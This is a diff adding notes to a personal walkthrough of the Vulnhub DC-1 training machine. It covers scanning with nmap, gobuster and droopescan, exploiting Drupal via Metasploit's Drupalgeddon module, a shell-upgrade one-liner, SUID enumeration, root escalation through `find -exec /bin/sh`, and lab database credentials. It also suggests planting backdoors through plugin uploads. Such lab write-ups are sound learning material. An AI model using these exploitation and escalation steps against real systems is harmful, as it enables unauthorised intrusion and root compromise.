@@ -1,3 +1,36 @@
+---
+title: DC1 walk-through/learnning notes..
+date: 2020-09-20 +0800
+categories: [pentest-learning,Vulnhub]
+tags: [CTF][vulnhub]     # TAG names should always be lowercase
+---
+#DC1-wirteups
+
+##scan
+
+first we need locate the machine.
+
+we got command as
+```
+arp-scan -l
+```
+or
+```
+netdiscover
+```
+```
+arp -a		#maybe fail.
+```
+than i got it on 192.168.242.129
+
+than nmap is we need; nmap can scan the machine with the ports,services,text and so on.so it's really useful when we are in the early information-collection steps of pentest/ctf and other place.
+
+so we go on 
+```
+nmap -A <ip-address>
+```
+[explain it](https://www.explainshell.com/explain?cmd=nmap+-A+127.0.0.1)
+```
 --------------------------nmap result--------------------------------
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 00:15 EDT
 Nmap scan report for 192.168.242.129
@@ -33,7 +66,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
+```
+we can find two things needed high-lights;
 
+one is druapl site! //a kind of cms
+
+one is robots.txt //the text will ban the sipder of information collecting
+
+we can curl/access with web broswer.
+
+by the way i use firefox(because it based on my kali default)
+```
 ----------------------found in robots.txt-------------------------
 don't allow path is
 # Directories
@@ -76,8 +119,38 @@ Disallow: /?q=user/password/
 Disallow: /?q=user/register/
 Disallow: /?q=user/login/
 Disallow: /?q=user/logout/
+```
+then for the aim of  information collection
 
----------------------------gobuster result------------------------------------
+we wanna know which of path we can access.
+
+as (HTTP 200 OK!)
+
+save it and open it in vim
+
+>Tips:
+>
+>use vim command mode as <ESC>
+>
+>command:
+>
+>:%s/Disallow: /
+>
+>this command can replace the Disallow: with a empty space
+>
+> for more detail you can see:[vim search command](https://harttle.land/2016/08/08/vim-search-in-file.html)
+
+Ok now we can use the dir brute force attack it.
+```
+gobuster dir -u http://<ip-address>/ -w /usr/share/wordlists/dirb/big.txt
+```
+this command means you go an dir attack (attack the <ip-address>
+
+with wordlists big.txt located in /usr/share/wordlists/dirb 
+
+>Tips: the location of /usr/share/wordlists is the kali-linux official wordlist"built-in" kali
+
+```
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -165,10 +238,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /sites (Status: 301)
 /themes (Status: 301)
 /user (Status: 200)
+```
 
+now i got a mistake that the cms scanner WP-scan is built-in kali.
+so i use the wp-scan in this step. 
 
+```
 ---------------------------------wpscan result----------------------------------------------------
- wpscan --url http://192.168.242.129 --wp-content-dir /user --force                    4 ⨯
+ wpscan --url http://192.168.242.129 --wp-content-dir /user --force            
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -246,7 +323,14 @@ Fingerprinting the version - Time: 00:00:25 <=============> (463 / 463) 100.00% 
 [+] Data Received: 215.362 KB
 [+] Memory used: 152.605 MB
 [+] Elapsed time: 00:00:27
+```
 
+
+after watching the google,and search the drupal cms scanner.
+THE DROOPESCANNNNNNNNNNNNERRRRRRRRRR.
+
+i scan the website again..
+```
 ---------------------------droopescan result-------------------------------------------
 ┌──(kali㉿EsonhughKALI-Desktop)-[~]
 └─$ droopescan scan drupal -u 192.168.242.129
@@ -276,8 +360,162 @@ Fingerprinting the version - Time: 00:00:25 <=============> (463 / 463) 100.00% 
     Default admin - http://192.168.242.129/user/login
 
 [+] Scan finished (0:05:01.892400 elapsed)
+```
+so what`s the most important or vulnerable in hacking an cms??
+>1) version
+>>why?
+>>
+>>version of some cms can find exp on internet or use command
+>> ``` 
+>> searchsploit xxx		#xxx can replace with the software,versions
+>> ```
+>2)themes and plugins
+>>there are many careless developer use unsafe codes.
+>>
+>>and the theme and plugins will get high level privilege when the web server runs.
+>>
+>>so if you can edit with them or upload them you can use evil php code/js code/.. to privilege you (get root) and get shell.
+>3)vulnerable setting file or profiles
+>>if any high privilege setting file is avaiable to anonymous users/low privilege users 
+>>
+>>it will make more unsafe factors in your sys,make more damage and cause unpredictable results.
+>>  
 
-find / -perm -u=s -type f 2>/dev/null
+so with guides, we can see the version is 7.22-7.26
+
+##getshell
+
+if we see this versio in metasploit or searchsploit.
+
+we can got the exp of it
+
+Drupageddon! is!
+```
+$msfconsole
+$search drupal
+$use 4		#(may other number)
+$info
+$#here give our machine infomation the exp need...
+run		#just run it
+
+```
+then we can got www-data//shell
+
+get shell!
+
+but the interface is really bad
+
+>tips:
+>using python command
+>```
+>python -c import pty;pty.spawn("/bin/bash")
+>```
+get shell
+---
+
+also it got SQLinjections too. searchsploit can help you and create an admin userof you.
+
+```
+$ searchsploit drupal 7
+ ------------------------------------------------------------------------------------------------------------------
+ Exploit Title                                                       |  Path (/usr/share/exploitdb/)
+ ------------------------------------------------------------------------------------------------------------------
+
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)    | exploits/php/webapps/34992.py
+```
+than looking my guide two,use upload plugins or themes in drupal to install shells and nc to create the backdoor.
+
+we can use msf and create the backdoor phps. 
+
+the passage [here](https://stoeps.de/2020/01/05/20200104-walkthrough-dc1/) has more detail.
+
+---
+also if you know the sql injection how to create may you can use the sql to pump your shell out.
+
+but i fail..if anyone can i hope he/she can tell me just send me email...
+
+---
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+```
+
+##level up your permission
+
+clear your mind
+
+now we got shell.
+
+we need to ask 3 question as a Philosopher.
+
+>1) who am i?
+>
+>2)what can i do?
+>
+>3)where i will go?
+
+the answer is clear.
+
+>whoami:www-data
+>
+>use command "whoami"/"id" to get detail infomation
+>
+>what can i do?
+>
+>to sure that we can use command
+>>as
+>```
+>compgen -a		#(alias)
+>	-u		#(user)
+>	-c		#(command)
+>```
+>but in some place as our own kali,this command is banned.
+>
+>also if find/locate command can use we can got the more deeper searching ability
+>
+>as we can search the flags or other useful things when pentest.
+>
+>where i will go?
+>
+>it is also clear
+>
+>RRRRRRROOOOOOOOOOOOOOOOOOOOTTTTTTT!!!
+
+
+frist we can use sudo can see some script or command you can use as root
+
+NOTHING!it is fucking NOTHING!
+
+then what we can do?
+
+sudo fail,but suid can!
+you can see any suid by this way
+
+ as follow..
+
+```
+$find / -perm -u=s -type f 2>/dev/null
+#or you can use
+$find / -perm /4000
+```
+[what is this command?frist one](https://www.explainshell.com/explain?cmd=find+%2F+-perm+u%3Ds+2%3E+%2Fdev%2Fnull)
+[what is this command?second one](https://www.explainshell.com/explain?cmd=find+%2F+-perm+%2F4000)
+```
+output>
 /bin/mount
 /bin/ping
 /bin/su
@@ -298,8 +536,39 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /sbin/mount.nfs
 user:www-data
+```
+>i got mistake there too.
+>i think may the procmail is the key
+>but actually not;
+>
 
+>so how i got this idea?(means to use the suid)
+>
+> it is TOP2 easiest way to get  shell(one is sudo)
+>
+>tips:
+>
+>recommend one [site](https://gtfobins.github.io/#) for wrong settings to privilege users
+>
+>use it as an cheatsheet...have fun~
+>
+>so you can easily find the `find` command suid to root it.
 
+command is following.
+
+```
+find . -exec '/bin/sh' \;-quit
+```
+also explain [it](https://www.explainshell.com/explain?cmd=find+.+-exec+%27%2Fbin%2Fsh%27+%5C%3B-quit)
+
+---
+another way
+
+ we can broswer the file system...
+
+like this~ 
+
+```
 ls -al 
 total 408
 drwxr-xr-x  3 www-data www-data   4096 Nov 21  2013 .
@@ -341,24 +610,57 @@ user.test:                     C++ source, UTF-8 Unicode text, with very long li
 user.tokens.inc:               PHP script, ASCII text
 pwd
 /var/www/modules/user
+```
+you can see flag1.txt in your www-data root dir
 
+it tell us to see the setting file
 
-root      3465  3363  0 19:49 pts/0    00:00:00 procmail
-www-data  3466  3356  0 19:50 ?        00:00:00 [sh] <defunct>
-www-data  3467     1  0 19:50 ?        00:00:00 /bin/sh
-www-data  3470  3467  0 19:51 ?        00:00:00 python -c import pty;pty.spawn("/bin/bash")
-www-data  3471  3470  0 19:51 pts/1    00:00:00 /bin/bash
-root      3481  3471  0 20:00 pts/1    00:00:00 procmail -t
-www-data  3490  3356  0 20:07 ?        00:00:00 sh -c /bin/sh 
-www-data  3491  3490  0 20:07 ?        00:00:00 /bin/sh
-root      3620     2  0 20:44 ?        00:00:00 [flush-8:0]
-root      3625  3491  0 20:48 ?        00:00:00 find . -exec /bin/sh ; -quit
-root      3626  3625  0 20:48 ?        00:00:00 /bin/sh
-root      3635     2  0 20:49 ?        00:00:00 [kworker/0:0]
-root      3639  3626  0 20:54 ?        00:00:00 ps -ef
+to carefully visit the file system.
 
-cd /root
+you can find the setting.php
 
+also it's flag2;
+
+it tell us the mysql database username and pass
+
+```
+$databases = array (
+  'default' =>
+  array (
+    'default' =>
+    array (
+      'database' => 'drupaldb',
+      'username' => 'dbuser',
+      'password' => 'R0ck3t',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+
+```
+
+so get in the mysql database you can see the admin pass(with encrypted one) 
+
+google"forget admin pass of drupal" can tell us drupal 7 encypt method and other way to access the drupal dashboard.
+
+so the method is you can both crack or change the pass in mysql or use drupal console to reset it. 
+
+make damage is whatever because nobody use this drupal but you. :)
+
+the backend has the article by admin,it's a hint.
+```
+Url is
+http://<ip-address>/node/2#overlay-context=shell
+Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
+```
+Unh..go to the method one get shell~~;
+---
+now you are root!
+WIN!!!!!
+```
 ls
 thefinalflag.txt
 
@@ -369,5 +671,7 @@ Hopefully you've enjoyed this and learned some new skills.
 
 You can let me know what you thought of this little journey
 by contacting me via Twitter - @DCAU7
-
+```
 -------------success-------------
+
+thank you for watching~I am Esonhugh,this is the frist blog for me.
